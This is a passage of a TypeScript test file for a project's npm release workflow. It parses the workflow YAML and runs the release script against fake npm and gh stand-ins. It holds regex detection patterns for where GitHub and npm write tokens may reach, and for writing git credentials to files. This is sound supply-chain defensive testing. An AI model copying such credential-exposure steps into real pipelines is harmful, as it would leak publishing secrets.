// SPDX-License-Identifier: Apache-2.0
// Copyright 2026 Usertools, Inc.

/**
 * THE RELEASE WORKFLOW PUBLISHES ONLY WHAT CI PASSED, ONLY AFTER AN APPROVAL, AND KEEPS ITS
 * WRITE CREDENTIALS AWAY FROM DEPENDENCY CODE. A DRY RUN CHANGES NOTHING.
 *
 * .github/workflows/publish.yml is read as YAML (not matched as prose) and scripts/release.sh,
 * which holds its shell logic, is run against a fake `npm` and `gh` in a throwaway git
 * repository. Nothing here talks to a registry or to GitHub.
 *
 * Pinned:
 * - REQUIRED_CI_JOBS names exactly the jobs ci.yml runs on a push to master, so adding,
 *   renaming or removing a CI job fails here until the release's list follows.
 * - Jobs: ci-gate, then build (read-only token, no OIDC: everything that runs dependency
 *   code), then publish (the `npm-publish` environment; write token, OIDC, NPM_TOKEN). No job
 *   that can write or mint an OIDC token installs, builds, tests or lints.
 * - No checkout persists a credential; the write token reaches git only in the push step.
 * - ci-gate refuses unless the environment requires a reviewer; a 404, a 403 and an
 *   unreadable answer all refuse.
 * - Order: commit and tag locally, pack, publish dry run, push, publish, GitHub Release.
 *   Nothing is published before the commit and tag are pushed.
 * - A dry run never pushes, publishes or creates a release.
 * - The CI gate fails closed and names the check: missing, pending, skipped and failed CI
 *   jobs, no CI run at all, and an unreadable registry all stop the release.
 * - Publishing assembles every tarball (scripts/release-tarball.py, pinned in
 *   release-tarball.test.ts) before publishing any, and npm is handed only those: from an
 *   empty directory, with --ignore-scripts, an explicit registry and a fresh private cache.
 * - Every npm publish, the dry run included, uses the dist-tag decided by the same latest-flag
 *   answer as the GitHub Release's Latest (no higher v* tag on master, and no package with a higher
 *   version on npm): `latest` for the newest release, as npm's default with no --tag so that
 *   npm's own implicit-latest refusal (npm 11.0.0 and later) stays active, and `--tag backfill`
 *   for an older version; nothing is published when that answer cannot be read.
 * - Before publishing any package, all six are checked on npm: a new release refuses one
 *   already there (in the dry run, before the push); a republish skips one only if npm holds
 *   this run's exact tarball (dist.integrity and dist.shasum). Only the registry's own 404 for
 *   a package reads as "never published"; no npm_config_tag reaches npm.
 * - The publish job runs Node 24 and refuses an npm older than 11 before touching the
 *   registry; the GitHub Release is created only after every package's publish succeeded.
 * - No setup-node restores a cache, and the publish job installs, packs and runs nothing.
 * - Republish gates on the release commit's parent only when the release commit changes
 *   nothing but the lockstep package.json "version" fields.
 */

import { execFileSync, spawnSync } from "node:child_process";
import { createHash } from "node:crypto";
import {
	chmodSync,
	existsSync,
	mkdirSync,
	mkdtempSync,
	readdirSync,
	readFileSync,
	rmSync,
	symlinkSync,
	writeFileSync,
} from "node:fs";
import { createRequire } from "node:module";
import { tmpdir } from "node:os";
import { join, resolve } from "node:path";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { parse } from "yaml";
import { archive, gz, member, readTar } from "./tar-fixture.js";

const ROOT = resolve(import.meta.dirname, "../../../..");
const PUBLISH = join(ROOT, ".github/workflows/publish.yml");
const CI = join(ROOT, ".github/workflows/ci.yml");
const RELEASING = join(ROOT, "docs/releasing.md");
const SCRIPT = join(ROOT, "scripts/release.sh");
const TOOL = join(ROOT, "scripts/release-tarball.py");

interface Step {
	name?: string;
	uses?: string;
	with?: Record<string, unknown>;
	if?: string;
	run?: string;
	env?: Record<string, unknown>;
}
interface Job {
	name?: string;
	needs?: string | string[];
	environment?: string | { name: string };
	permissions?: Record<string, string>;
	steps?: Step[];
}
interface Workflow {
	env?: Record<string, string>;
	permissions?: Record<string, string>;
	jobs: Record<string, Job>;
}

const publish = parse(readFileSync(PUBLISH, "utf8")) as Workflow;
const ci = parse(readFileSync(CI, "utf8")) as Workflow;

/** A ci.yml job's name on a push to master. An expression name must yield its key there. */
function pushName(key: string, job: Job): string {
	const name = job.name ?? key;
	if (!name.includes("${{")) return name;
	if (!name.includes(`&& '${key}' ||`)) {
		throw new Error(`ci.yml job ${key}: cannot tell its push-event name from "${name}"`);
	}
	return key;
}

const requiredJobs = (publish.env?.REQUIRED_CI_JOBS ?? "").split(/\s+/).filter(Boolean);
const jobSteps = (job: string): Step[] => {
	const steps = publish.jobs[job]?.steps;
	if (!Array.isArray(steps)) throw new Error(`publish.yml has no job "${job}"`);
	return steps;
};
const allSteps = (): [string, Step][] =>
	Object.keys(publish.jobs).flatMap((j) => jobSteps(j).map((s): [string, Step] => [j, s]));
const stepIndex = (job: string, name: string): number => {
	const i = jobSteps(job).findIndex((s) => s.name === name);
	if (i < 0) throw new Error(`job ${job} has no step named "${name}"`);
	return i;
};
const step = (job: string, name: string): Step => jobSteps(job)[stepIndex(job, name)] as Step;
const envName = (job: Job): string | undefined =>
	typeof job.environment === "string" ? job.environment : job.environment?.name;
/** Holds a credential that can write to the repository or mint an OIDC token. */
const privileged = (job: Job): boolean =>
	job.permissions?.contents === "write" || job.permissions?.["id-token"] === "write";
/** Runs code from the repository's dependencies (or the package manager on their behalf). */
const DEPENDENCY_CODE =
	/\bnpm\s+(ci|install|i|run|test|exec|version|rebuild)\b|\bnpx\b|\bvitest\b|\btsc\b|\bbiome\b|\bvite\b|\btsx\b/;
const WRITE_TOKEN = /github\.token|secrets\.GITHUB_TOKEN/;

describe("publish.yml", () => {
	it("REQUIRED_CI_JOBS names exactly the jobs ci.yml runs on a push", () => {
		const ciNames = Object.entries(ci.jobs).map(([k, j]) => pushName(k, j));
		expect([...requiredJobs].sort()).toEqual([...ciNames].sort());
		expect(requiredJobs.length).toBeGreaterThanOrEqual(7);
	});

	it("runs ci-gate, then build, then publish under the npm-publish environment", () => {
		expect(Object.keys(publish.jobs).sort()).toEqual(["build", "ci-gate", "publish"]);
		expect([publish.jobs.build?.needs ?? []].flat()).toEqual(["ci-gate"]);
		expect([publish.jobs.publish?.needs ?? []].flat()).toEqual(["build"]);
		expect(envName(publish.jobs.publish as Job)).toBe("npm-publish");
		expect(envName(publish.jobs.build as Job)).toBeUndefined();
	});

	it("grants nothing by default, and write and OIDC only to the publish job", () => {
		expect(publish.permissions).toEqual({});
		expect(publish.jobs["ci-gate"]?.permissions).toEqual({ contents: "read", actions: "read" });
		expect(publish.jobs.build?.permissions).toEqual({ contents: "read" });
		expect(publish.jobs.publish?.permissions).toEqual({
			contents: "write",
			"id-token": "write",
			actions: "read",
		});
		const holders = Object.entries(publish.jobs)
			.filter(([, j]) => privileged(j))
			.map(([k]) => k);
		expect(holders).toEqual(["publish"]);
	});

	it("no job that can write or mint an OIDC token runs dependency code", () => {
		for (const [name, job] of Object.entries(publish.jobs)) {
			if (!privileged(job)) continue;
			for (const s of job.steps ?? []) {
				expect(s.run ?? "", `${name}: ${s.name}`).not.toMatch(DEPENDENCY_CODE);
				if (s.uses) {
					expect(s.uses).toMatch(/^actions\/(checkout|setup-node|download-artifact)@/);
					expect(s.with?.cache, `${name}: ${s.uses} restores no cache`).toBeUndefined();
				}
			}
		}
		// The control: the build job does run it, so the pattern can see it.
		expect(jobSteps("build").some((s) => DEPENDENCY_CODE.test(s.run ?? ""))).toBe(true);
	});

	it("no checkout persists a credential", () => {
		const checkouts = allSteps().filter(([, s]) => s.uses?.startsWith("actions/checkout@"));
		expect(checkouts.length).toBe(3);
		for (const [job, s] of checkouts) {
			expect(s.with?.["persist-credentials"], `${job}: checkout`).toBe(false);
		}
	});

	it("in a privileged job, the write token reaches only the gate, the push and the release", () => {
		const withToken = jobSteps("publish").filter((s) => WRITE_TOKEN.test(JSON.stringify(s)));
		expect(withToken.map((s) => s.name)).toEqual([
			"Require CI success on the commit being released",
			"Push the release commit and tag",
			"Create GitHub Release",
		]);
		// Only the push hands it to git, through the environment of one process, never a file.
		const handsToGit = allSteps().filter(([, s]) => /extraheader|GIT_CONFIG_/.test(s.run ?? ""));
		expect(handsToGit.map(([, s]) => s.name)).toEqual(["Push the release commit and tag"]);
		const push = step("publish", "Push the release commit and tag");
		expect(push.run).toContain("GIT_CONFIG_VALUE_0=");
		expect(push.run).not.toMatch(/git\s+config|git\s+remote|>>|\btee\b|GITHUB_ENV/);
		// And no step anywhere writes git credentials to a file.
		for (const [job, s] of allSteps()) {
			expect(s.run ?? "", `${job}: ${s.name}`).not.toMatch(
				/git\s+config[^\n]*(extraheader|credential|url\.)|git\s+remote\s+set-url/,
			);
		}
	});

	it("ci-gate requires an approval on the environment the publish job uses", () => {
		const gate = jobSteps("ci-gate").filter((s) =>
			/release\.sh assert-protected\b/.test(s.run ?? ""),
		);
		expect(gate.length).toBe(1);
		expect(gate[0]?.run).toMatch(
			new RegExp(`release\\.sh assert-protected ${envName(publish.jobs.publish as Job)}\\s*$`),
		);
		expect(gate[0]?.if).toBeUndefined();
	});

	it("the CI gate runs in ci-gate and again in publish, before the artifacts are used", () => {
		expect(jobSteps("ci-gate").some((s) => /release\.sh gate\b/.test(s.run ?? ""))).toBe(true);
		const gate = jobSteps("publish").findIndex((s) => /release\.sh gate\b/.test(s.run ?? ""));
		const download = jobSteps("publish").findIndex((s) =>
			s.uses?.startsWith("actions/download-artifact@"),
		);
		expect(gate).toBeGreaterThanOrEqual(0);
		expect(gate).toBeLessThan(download);
	});

	it("build commits, tags and packs, in that order, and hands the result on", () => {
		const order = [
			stepIndex("build", "Commit and tag (local)"),
			stepIndex("build", "The tree to publish is the tree committed"),
			stepIndex("build", "Pack the packages and the release commit"),
			jobSteps("build").findIndex((s) => s.uses?.startsWith("actions/upload-artifact@")),
		];
		expect(order).toEqual([...order].sort((a, b) => a - b));
		expect(order[3]).toBeGreaterThan(0);
	});

	it("publish verifies, dry-runs, pushes, publishes, then releases, in that order", () => {
		const order = [
			jobSteps("publish").findIndex((s) => s.uses?.startsWith("actions/download-artifact@")),
			stepIndex("publish", "Select and verify what to publish"),
			stepIndex("publish", "Publish packages (dry run)"),
			stepIndex("publish", "Push the release commit and tag"),
			stepIndex("publish", "Publish packages"),
			stepIndex("publish", "Create GitHub Release"),
		];
		expect(order[0]).toBeGreaterThan(0);
		expect(order).toEqual([...order].sort((a, b) => a - b));
	});

	it("a dry run never pushes, publishes or creates a release", () => {
		const effects =
			/\bgit push\b|\bgh release create\b|\bnpm publish\b(?![^\n]*--dry-run)|release\.sh publish\b(?![^\n]*--dry-run)/;
		const effectful = allSteps().filter(([, s]) => effects.test(s.run ?? ""));
		expect(effectful.map(([j, s]) => `${j}: ${s.name}`)).toEqual([
			"publish: Push the release commit and tag",
			"publish: Publish packages",
			"publish: Create GitHub Release",
		]);
		for (const [, s] of effectful) expect(s.if ?? "").toContain("!inputs.dry_run");
	});

	it("a republish never bumps, commits, tags or pushes", () => {
		for (const [job, name] of [
			["build", "Refuse to bump past a version that is not fully published"],
			["build", "Refuse a version that is already released"],
			["build", "Format package.json after bump"],
			["build", "Commit and tag (local)"],
			["publish", "Push the release commit and tag"],
		] as const) {
			expect(step(job, name).if ?? "", `${job}: ${name}`).toContain("!inputs.republish");
		}
	});

	it("a normal release publishes only after its push succeeded", () => {
		const push = step("publish", "Push the release commit and tag");
		const pub = step("publish", "Publish packages");
		const rel = step("publish", "Create GitHub Release");
		expect(stepIndex("publish", push.name as string)).toBeLessThan(
			stepIndex("publish", pub.name as string),
		);
		// A failed step skips every later step unless one asks to run anyway; none may.
		for (const s of jobSteps("publish")) {
			expect(s, `publish: ${s.name}`).not.toHaveProperty("continue-on-error");
			expect(s.if ?? "", `publish: ${s.name}`).not.toMatch(/always\(|failure\(|cancelled\(/);
		}
		expect(publish.jobs.publish).not.toHaveProperty("continue-on-error");
		// And the push itself cannot swallow its own failure.
		expect(push.run).not.toMatch(/\|\||set \+e|\btrue\b/);
		expect(rel.if).toBe(pub.if);
	});

	it("every GitHub Release states Latest explicitly, from the semver comparison", () => {
		const rel = step("publish", "Create GitHub Release").run ?? "";
		expect(rel).toMatch(/latest=\$\(bash scripts\/release\.sh latest-flag "\$VERSION"\)/);
		const creates = rel.split("\n").filter((l) => /gh release create/.test(l));
		expect(creates.length).toBe(1);
		expect(rel).toMatch(/"--latest=\$\{latest\}"/);
		expect(rel).not.toMatch(/--latest(?!=\$\{latest\})/);
	});

	it("the publish job never executes, checks out or configures from the build's output", () => {
		for (const s of jobSteps("publish")) {
			expect(s.run ?? "", `publish: ${s.name}`).not.toMatch(
				/\bnode\b|\bnpx?\b|require\(|import\(|git\s+(checkout|switch|reset|restore|worktree|stash)\b|(^|[;&|]\s*)(source|\.)\s/m,
			);
			if (s.uses?.startsWith("actions/setup-node@")) {
				expect(s.with?.["registry-url"], "setup-node writes no npm config").toBeUndefined();
			}
		}
		// The build's reported version is read in exactly one place, which validates it.
		const fromBuild = jobSteps("publish").filter((s) => JSON.stringify(s).includes("needs.build"));
		expect(fromBuild.map((s) => s.name)).toEqual(["Select and verify what to publish"]);
		for (const name of [
			"Push the release commit and tag",
			"Publish packages",
			"Create GitHub Release",
		]) {
			expect(JSON.stringify(step("publish", name).env), name).toContain("steps.source.outputs");
		}
		expect(step("publish", "Push the release commit and tag").run).toMatch(
			/"\$\{COMMIT\}:refs\/heads\/master"/,
		);
	});

	it("only the publish step sees the npm token", () => {
		const withToken = allSteps().filter(([, s]) => JSON.stringify(s).includes("NPM_TOKEN"));
		expect(withToken.map(([j, s]) => `${j}: ${s.name}`)).toEqual(["publish: Publish packages"]);
	});

	it("no setup-node restores a cache, and no step is a cache step", () => {
		const setups = allSteps().filter(([, s]) => s.uses?.startsWith("actions/setup-node@"));
		expect(setups.map(([j]) => j)).toEqual(["build", "publish"]);
		for (const [job, s] of setups) {
			expect(s.with?.["package-manager-cache"], `${job}: setup-node`).toBe(false);
			expect(s.with ?? {}, `${job}: setup-node`).not.toHaveProperty("cache");
			expect(s.with ?? {}, `${job}: setup-node`).not.toHaveProperty("cache-dependency-path");
		}
		for (const [job, s] of allSteps()) {
			expect(s.uses ?? "", `${job}: ${s.name}`).not.toMatch(/^actions\/cache\b/);
		}
	});

	it("the publish job installs, packs, runs and caches nothing", () => {
		for (const s of jobSteps("publish")) {
			expect(s.run ?? "", `publish: ${s.name}`).not.toMatch(
				/\bnpm\s+(ci|install|i|pack|run|run-script|exec|rebuild|cache)\b|\bnpx\b|actions\/cache/,
			);
		}
		const publishes = jobSteps("publish").filter((s) => /release\.sh publish\b/.test(s.run ?? ""));
		expect(publishes.map((s) => s.name)).toEqual([
			"Publish packages (dry run)",
			"Publish packages",
		]);
	});

	it("the build runs Node 22; the publish job runs Node 24 and requires npm 11 first", () => {
		const setups = allSteps().filter(([, s]) => s.uses?.startsWith("actions/setup-node@"));
		// The publish job's major only; the exact pin is the next test's.
		expect(
			setups.map(([j, s]) => `${j}: ${String(s.with?.["node-version"]).split(".")[0]}`),
		).toEqual(["build: 22", "publish: 24"]);
		// npm 11 added the refusal to apply latest implicitly to a lower version, the backstop
		// for the dist-tag check: the step right after setup-node refuses an older npm, on every
		// run (dry runs included), before anything reads or writes the registry.
		const steps = jobSteps("publish");
		const setup = steps.findIndex((s) => s.uses?.startsWith("actions/setup-node@"));
		const assert = stepIndex("publish", "Require npm 11 or later");
		expect(assert).toBe(setup + 1);
		expect(steps[assert]?.run?.trim()).toBe("bash scripts/release.sh assert-npm");
		expect(steps[assert]?.if).toBeUndefined();
		expect(assert).toBeLessThan(stepIndex("publish", "Publish packages (dry run)"));
		expect(assert).toBeLessThan(
			stepIndex("publish", "Require CI success on the commit being released"),
		);
	});

	it("the publish job pins an exact Node version, the one docs/releasing.md names", () => {
		// The npm behaviour the docs cite was read at the npm this Node bundles; a floating
		// version would change it silently, and a bump must update the citations with it.
		const setup = jobSteps("publish").find((s) => s.uses?.startsWith("actions/setup-node@"));
		const pinned = String(setup?.with?.["node-version"]);
		expect(pinned).toMatch(/^\d+\.\d+\.\d+$/);
		const named = [
			...readFileSync(RELEASING, "utf8").matchAll(/publish job pins \*\*Node (\d+\.\d+\.\d+)\*\*/g),
		].map((m) => m[1]);
		expect(named).toEqual([pinned]);
	});

	it("the dry run, which refuses a version already on npm, runs in every mode before the push", () => {
		// release.sh publish checks all six on npm before publishing any, and a new release
		// refuses one already there; it reads the mode from REPUBLISH, set for every step.
		expect(publish.env?.REPUBLISH).toMatch(/^\$\{\{ inputs\.republish \}\}$/);
		const dry = step("publish", "Publish packages (dry run)");
		expect(dry.if).toBeUndefined();
		expect(dry.run?.trim()).toMatch(
			/^bash scripts\/release\.sh publish "\$\{RUNNER_TEMP\}\/release" "\$COMMIT" --dry-run$/,
		);
		expect(stepIndex("publish", "Publish packages (dry run)")).toBeLessThan(
			stepIndex("publish", "Push the release commit and tag"),
		);
	});

	it("the GitHub Release is created only after every package's publish succeeded", () => {
		const pub = step("publish", "Publish packages");
		const rel = step("publish", "Create GitHub Release");
		expect(stepIndex("publish", "Create GitHub Release")).toBe(
			stepIndex("publish", "Publish packages") + 1,
		);
		// The same condition, which never runs after a failure (the test above bans always(),
		// failure(), cancelled() and continue-on-error), and a publish step that cannot swallow
		// release.sh publish's exit status.
		expect(pub.if).toMatch(/^\$\{\{ !inputs\.dry_run \}\}$/);
		expect(rel.if).toBe(pub.if);
		expect(pub.run?.trim()).toMatch(
			/^bash scripts\/release\.sh publish "\$\{RUNNER_TEMP\}\/release" "\$COMMIT"$/,
		);
	});

	it("publishes with NPM_TOKEN and --provenance; id-token: write is on the publish job only", () => {
		// npm 11 exchanges the job's OIDC token for a publish token by itself whenever it can
		// (lib/utils/oidc.js, from v11.5.0), and --provenance signs with the same token: no other
		// job, and not the workflow as a whole, may be able to mint it.
		const pub = step("publish", "Publish packages");
		expect(pub.env?.NODE_AUTH_TOKEN).toMatch(/^\$\{\{ secrets\.NPM_TOKEN \}\}$/);
		expect(pub.run).toMatch(/release\.sh publish\b/);
		expect(readFileSync(SCRIPT, "utf8")).toMatch(
			/set -- "\$@" --provenance --ignore-scripts --registry "\$REGISTRY"/,
		);
		expect(publish.permissions ?? {}).not.toHaveProperty("id-token");
		const minters = Object.entries(publish.jobs)
			.filter(([, j]) => j.permissions?.["id-token"] !== undefined)
			.map(([k, j]) => `${k}: ${j.permissions?.["id-token"]}`);
		expect(minters).toEqual(["publish: write"]);
		for (const [k, j] of Object.entries(publish.jobs)) {
			expect(j.permissions, `${k} declares its permissions`).toBeDefined();
		}
	});

	it("the release commit is made with a DCO sign-off", () => {
		const run = step("build", "Commit and tag (local)").run ?? "";
		const commits = run.split("\n").filter((l) => /\bgit commit\b/.test(l));
		expect(commits.map((l) => l.trim())).toEqual([`git commit -s -m "release: v$${"{"}VERSION}"`]);
	});
});

// ── scripts/release.sh against a fake npm, gh and git history ──

const DIRS = ["core", "verify", "openclaw", "server", "acs-adapter", "ui"];
const NAMES: Record<string, string> = {
	core: "usertrust",
	verify: "usertrust-verify",
	openclaw: "usertrust-openclaw",
	server: "usertrust-server",
	"acs-adapter": "usertrust-acs-adapter",
	ui: "usertrust-ui",
};

const FAKE_NPM = `#!/usr/bin/env bash
# Every call's subcommand is appended to $FAKE_CALLS.
# view <spec> version: answers from $FAKE_REGISTRY ("<spec> yes|no|error" lines; unlisted = no).
# view <name> versions --json: appends its arguments to $FAKE_LOG.views and answers from a
#   "<name> versions <answer>" line in $FAKE_REGISTRY: a comma-separated list (a JSON array),
#   one:<v> (a JSON string), raw:<text> (printed as is), empty (no output), error (ETIMEDOUT),
#   unpublished, nomatch:<tag> or e404-other (the E404s npm prints for those); without one, the
#   "<name>@<v> yes" lines' versions, and the registry's 404 for the package if there are none.
#   As npm does (lib/commands/view.js), the bare name resolves against the tag config: --tag,
#   else npm_config_tag in the environment (the name in any case), else latest; a tag other
#   than latest with no "<name> disttag <tag>" line fails E404 "No match found for version".
#   Failures print npm's --json error object on stdout, and its lines on stderr.
# view <name>@<v> dist --json: answers from a "<name>@<v> dist <integrity> <shasum>" line, or
#   "<name>@<v> dist error|raw:<text>"; none = E404.
# --version: prints $FAKE_NPM_VERSION (11.19.0 if unset).
# pack ...: writes a ustar tarball, as npm's packer does, of package.json, README.md, LICENSE,
#   NOTICE and dist/ to --pack-destination; logs "pack|<dir>|<args>".
# publish <tgz> ...: records what it was given, and where, in $FAKE_LOG, and keeps a copy of the
#   tarball as $FAKE_LOG.<tarball name>. With no --tag, refuses as npm 11 does when
#   $FAKE_REGISTRY has a "<name> refuses-latest <version>" line (npm's own check finds a
#   version at least as high, which npm view did not show), and records any npm_config_tag
#   in its environment in $FAKE_LOG.tagenv.
echo "$1" >> "$FAKE_CALLS"
case "$1" in
--version) echo "\${FAKE_NPM_VERSION-11.19.0}" ;;
pack)
	echo "pack|$(basename "$PWD")|$*" >> "$FAKE_LOG"
	dest=""
	while [ $# -gt 0 ]; do
		[ "$1" = --pack-destination ] && dest="$2"
		shift
	done
	python3 - "$dest" <<'PY'
import json, os, sys, tarfile
m = json.load(open("package.json"))
paths = ["package.json"] + [p for p in ("README.md", "LICENSE", "NOTICE") if os.path.isfile(p)]
for top, dirs, files in os.walk("dist"):
    dirs.sort()
    paths += [os.path.join(top, f) for f in sorted(files)]
out = os.path.join(sys.argv[1], m["name"] + "-" + m["version"] + ".tgz")
with tarfile.open(out, "w:gz", format=tarfile.USTAR_FORMAT) as t:
    for p in paths:
        t.add(p, arcname="package/" + p, recursive=False)
PY
	;;
view)
	npmerr() {
		printf '{\\n  "error": {\\n    "code": "%s",\\n    "summary": "%s",\\n    "detail": ""\\n  }\\n}\\n' "$1" "$2"
		echo "npm error code $1" >&2
		echo "npm error 404 $2" >&2
		exit 1
	}
	tag=$(env | awk '{ i = index($0, "="); if (tolower(substr($0, 1, i - 1)) == "npm_config_tag") { print substr($0, i + 1); exit } }')
	[ -n "$tag" ] || tag=latest
	prev=""
	for a in "$@"; do
		[ "$prev" = --tag ] && tag="$a"
		prev="$a"
	done
	case "$3" in
	dist)
		dist=$(awk -v s="$2" '$1 == s && $2 == "dist" { print $3 " " $4 }' "$FAKE_REGISTRY")
		case "$dist" in
		"" | " ") npmerr E404 "No match found for version \${2##*@}" ;;
		"error "*) npmerr ETIMEDOUT "request to https://registry.npmjs.org/ failed" ;;
		raw:*) echo "\${dist#raw:}" ;;
		*) printf '{\\n  "integrity": "%s",\\n  "shasum": "%s"\\n}\\n' "\${dist% *}" "\${dist#* }" ;;
		esac
		;;
	version)
		state=$(awk -v s="$2" '$1 == s && $2 != "dist" { print $2 }' "$FAKE_REGISTRY")
		case "$state" in
		yes) echo "\${2##*@}" ;;
		error) echo "npm error code ETIMEDOUT" >&2; exit 1 ;;
		*) echo "npm error code E404" >&2; exit 1 ;;
		esac
		;;
	versions)
		echo "$*" >> "$FAKE_LOG.views"
		answer=$(awk -v s="$2" '$1 == s && $2 == "versions" { print $3 }' "$FAKE_REGISTRY")
		if [ -z "$answer" ]; then
			answer=$(awk -v n="$2" 'index($1, n "@") == 1 && $2 == "yes" { print substr($1, length(n) + 2) }' "$FAKE_REGISTRY" | paste -sd, -)
		fi
		[ -n "$answer" ] || npmerr E404 "Not Found - GET https://registry.npmjs.org/$2 - Not found"
		if [ "$tag" != latest ] && ! awk -v s="$2" -v t="$tag" '$1 == s && $2 == "disttag" && $3 == t { f = 1 } END { exit !f }' "$FAKE_REGISTRY"; then
			npmerr E404 "No match found for version $tag"
		fi
		case "$answer" in
		error) npmerr ETIMEDOUT "request to https://registry.npmjs.org/$2 failed, reason: timed out" ;;
		unpublished) npmerr E404 "Unpublished on 2026-01-01T00:00:00.000Z" ;;
		nomatch:*) npmerr E404 "No match found for version \${answer#nomatch:}" ;;
		e404-other) npmerr E404 "Not Found - GET https://registry.npmjs.org/some-other-package - Not found" ;;
		empty) ;;
		one:*) echo "\\"\${answer#one:}\\"" ;;
		raw:*) echo "\${answer#raw:}" ;;
		*) echo "[\\"$(echo "$answer" | sed 's/,/", "/g')\\"]" ;;
		esac
		;;
	*) echo "fake npm: unexpected $*" >&2; exit 99 ;;
	esac
	;;
publish)
	# Logs: tarball | flags | entries in the cwd | user config text | global config bytes.
	shift
	tgz="$1"
	shift
	flags=""
	cfg=/dev/null
	gcfg=/dev/null
	while [ $# -gt 0 ]; do
		case "$1" in
		--userconfig) cfg="$2"; shift ;;
		--globalconfig) gcfg="$2"; shift ;;
		*) flags="$flags $1" ;;
		esac
		shift
	done
	env | grep -i '^npm_config_tag=' >> "$FAKE_LOG.tagenv"
	case " $flags " in
	*" --tag "*) ;;
	*)
		name=$(basename "$tgz" | sed 's/-[0-9][0-9.]*\\.tgz$//')
		higher=$(awk -v s="$name" '$1 == s && $2 == "refuses-latest" { print $3 }' "$FAKE_REGISTRY")
		if [ -n "$higher" ]; then
			echo "npm error Cannot implicitly apply the \\"latest\\" tag because previously published version $higher is higher than the new version. You must specify a tag using --tag." >&2
			exit 1
		fi
		;;
	esac
	cwd=$(ls -A | wc -l | tr -d ' ')
	cache=missing
	if [ -n "\${npm_config_cache:-}" ] && [ -d "$npm_config_cache" ]; then
		cache=used
		if [ -z "$(ls -A "$npm_config_cache")" ]; then cache=fresh; fi
		case "$(ls -ld "$npm_config_cache")" in drwx------*) ;; *) cache="$cache-shared" ;; esac
		echo "$npm_config_cache" >> "$FAKE_LOG.caches"
	fi
	case "$tgz" in
	"$FAKE_ARTIFACTS"/*) from=artifact ;;
	/*) from=assembled ;;
	*) from=relative ;;
	esac
	cp "$tgz" "$FAKE_LOG.$(basename "$tgz")"
	echo "publish|$(basename "$tgz")|\${flags# }|cwd=\${cwd}|userconfig=$(tr '\n' ';' < "$cfg")|globalconfig=$(wc -c < "$gcfg" | tr -d ' ')|cache=\${cache}|from=\${from}" >> "$FAKE_LOG"
	;;
*) echo "fake npm: unexpected $*" >&2; exit 99 ;;
esac
`;

const FAKE_GH = `#!/usr/bin/env bash
# api <path>: records the path in $FAKE_LOG; answers runs from $FAKE_RUNS, jobs from $FAKE_JOBS,
# an environment from $FAKE_ENV, or fails with HTTP $FAKE_ENV_HTTP when that is set.
[ "$1" = api ] || { echo "fake gh: unexpected $*" >&2; exit 99; }
echo "gh|$2" >> "$FAKE_LOG"
case "$2" in
*/actions/workflows/ci.yml/runs*) cat "$FAKE_RUNS" ;;
*/actions/runs/*/jobs*) cat "$FAKE_JOBS" ;;
*/environments/*)
	if [ -n "\${FAKE_ENV_HTTP:-}" ]; then
		echo '{"message":"error"}'
		echo "gh: error (HTTP \${FAKE_ENV_HTTP})" >&2
		exit 1
	fi
	cat "$FAKE_ENV"
	;;
*) echo "fake gh: unexpected path $2" >&2; exit 99 ;;
esac
`;

let dir: string;
let repo: string;

function git(...args: string[]): string {
	const r = spawnSync("git", args, { cwd: repo, encoding: "utf8", env: gitEnv() });
	if (r.status !== 0) throw new Error(`git ${args.join(" ")}: ${r.stderr}`);
	return r.stdout.trim();
}

function gitIn(cwd: string, ...args: string[]): string {
	const r = spawnSync("git", args, { cwd, encoding: "utf8", env: gitEnv() });
	if (r.status !== 0) throw new Error(`git ${args.join(" ")}: ${r.stderr}`);
	return r.stdout.trim();
}

function gitEnv(): NodeJS.ProcessEnv {
	return {
		...process.env,
		GIT_CONFIG_GLOBAL: "/dev/null",
		GIT_CONFIG_NOSYSTEM: "1",
		GIT_AUTHOR_NAME: "t",
		GIT_AUTHOR_EMAIL: "t@example.com",
		GIT_COMMITTER_NAME: "t",
		GIT_COMMITTER_EMAIL: "t@example.com",
	};
}

function writePackages(version: string, extra: Record<string, unknown> = {}): void {
	for (const d of DIRS) {
		mkdirSync(join(repo, "packages", d), { recursive: true });
		const pkg = { name: NAMES[d], version, license: "Apache-2.0", files: ["dist"], ...extra };
		writeFileSync(
			join(repo, "packages", d, "package.json"),
			`${JSON.stringify(pkg, null, "\t")}\n`,
		);
	}
}

function setRegistry(lines: string[]): void {
	writeFileSync(join(dir, "registry"), `${lines.join("\n")}\n`);
}

const job = (name: string, conclusion: string | null, status = "completed") => ({
	name,
	status,
	conclusion,
});

function setCi(
	jobs: ReturnType<typeof job>[] | null,
	run: { status?: string; conclusion?: string | null } = {},
): void {
	const runs =
		jobs === null
			? []
			: [
					{
						id: 42,
						html_url: "https://example.invalid/runs/42",
						created_at: "2026-01-01T00:00:00Z",
						status: run.status ?? "completed",
						conclusion: run.conclusion === undefined ? "success" : run.conclusion,
					},
				];
	writeFileSync(
		join(dir, "runs.json"),
		JSON.stringify({ total_count: runs.length, workflow_runs: runs }),
	);
	writeFileSync(join(dir, "jobs.json"), JSON.stringify({ jobs: jobs ?? [] }));
}

const allGreen = () => requiredJobs.map((n) => job(n, "success"));

const reviewersRule = (n: number, preventSelfReview = true) => ({
	id: 2,
	type: "required_reviewers",
	prevent_self_review: preventSelfReview,
	reviewers: Array.from({ length: n }, (_, i) => ({
		type: "User",
		reviewer: { login: `r${i}`, id: i },
	})),
});

function setEnvironment(body: unknown): void {
	writeFileSync(join(dir, "env.json"), typeof body === "string" ? body : JSON.stringify(body));
}

const protectedEnv = (
	rules: unknown[] = [reviewersRule(1)],
	policy: unknown = { protected_branches: false, custom_branch_policies: true },
) => ({
	id: 1,
	name: "npm-publish",
	protection_rules: rules,
	deployment_branch_policy: policy,
});

/** The tarballs `release.sh pack` writes, through the fake npm, into <dir>/tarballs. */
function packAll(): string {
	const out = join(dir, "tarballs");
	const r = run(["pack", out]);
	if (r.status !== 0) throw new Error(`pack failed: ${r.err}`);
	rmSync(join(dir, "log"), { force: true });
	return out;
}

/** The fake npm's log line for each publish: the assembled tarball, from an empty directory,
 * with the exact flags (no --tag for latest, npm's default, so npm's own guard applies;
 * --tag backfill otherwise), our user config (the token reference only), an empty global
 * config and a fresh private cache. */
const published = (version: string, dirs: string[], dry: boolean, tag = "latest") =>
	dirs.map(
		(d) =>
